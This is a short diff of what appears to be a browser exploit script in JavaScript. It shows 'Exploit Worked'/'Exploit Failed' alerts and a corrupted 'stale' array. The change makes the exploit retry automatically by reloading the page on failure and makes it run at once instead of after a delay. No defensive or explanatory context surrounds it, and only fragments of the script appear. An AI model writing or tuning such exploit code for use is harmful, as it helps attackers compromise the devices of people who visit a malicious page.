@@ -127,7 +127,7 @@ for (var i = 0; i < 0x1000; i++){
 		alert("Exploit Worked v3");
 	} else {
 		alert("Exploit Failed");
-		return;
+		document.location.reload();
 	}
 	 
 	stale[0] += 0x101;
@@ -278,5 +278,5 @@ function go() {
     dgc();
     setTimeout(go_, 400);
 }
-setTimeout(go, 5000);
+go();
 
